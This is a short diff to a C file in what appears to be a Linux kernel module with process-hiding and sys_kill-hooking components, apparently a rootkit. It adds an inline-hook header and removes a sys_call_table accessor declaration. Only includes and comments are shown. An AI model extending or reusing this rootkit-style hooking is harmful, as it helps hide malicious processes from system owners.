@@ -4,10 +4,8 @@
 #include <asm/unistd.h>
 #include "hide_kill.h"
 #include "hide_proc.h"
+#include "inline_hook/p_lkrg_main.h"
 #include "inline_hook/utils/p_memory.h"
-
-// From p_install.c, we need access to the table
-extern unsigned long * get_sys_call_table(void);
 
 // Storage for the original sys_kill function pointer
 // The actual sys_kill function takes pid and sig, not pt_regs.
